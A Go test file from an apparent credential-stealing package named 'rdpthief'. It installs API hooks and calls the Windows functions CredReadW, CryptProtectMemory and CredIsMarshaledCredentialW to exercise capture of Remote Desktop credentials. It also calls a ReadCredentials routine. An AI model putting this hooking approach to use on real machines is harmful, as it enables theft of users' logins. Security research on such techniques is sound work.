package rdpthief

import (
	"fmt"
	"testing"
	"unsafe"

	"github.com/stretchr/testify/require"
	"golang.org/x/sys/windows"
)

func TestHook_Install(t *testing.T) {
	h := Hook{}
	err := h.Install()
	require.NoError(t, err)

	ptr := windows.StringToUTF16Ptr("host")

	proc := windows.NewLazySystemDLL("advapi32.dll").NewProc("CredReadW")
	ret, _, err := proc.Call(uintptr(unsafe.Pointer(ptr)), 1, 1, 123)
	fmt.Println("0", ret)
	fmt.Println("err", err)

	fmt.Printf("0x%X\n", proc.Addr())

	password := []byte{
		0x0c, 0x00, 0x00, 0x00, 0x61, 0x00, 0x61, 0x00, 0x61, 0x00,
		0x73, 0x00, 0x73, 0x00, 0x73, 0x00,
	}
	proc = windows.NewLazySystemDLL("crypt32.dll").NewProc("CryptProtectMemory")
	ret, _, _ = proc.Call(uintptr(unsafe.Pointer(&password[0])), 16, 1)
	fmt.Println("1", ret)

	fmt.Printf("0x%X\n", proc.Addr())

	ptr2 := windows.StringToUTF16Ptr("username")
	proc = windows.NewLazySystemDLL("advapi32.dll").NewProc("CredIsMarshaledCredentialW")
	ret, _, _ = proc.Call(uintptr(unsafe.Pointer(ptr2)))
	fmt.Println("2", ret)

	fmt.Printf("0x%X\n", proc.Addr())

	select {}

	err = h.Uninstall()
	require.NoError(t, err)
	//
	// asd := Hook{}
	// err = asd.Install()
	// require.NoError(t, err)
}

func TestReadCredentials(t *testing.T) {
	ReadCredentials(0)
}
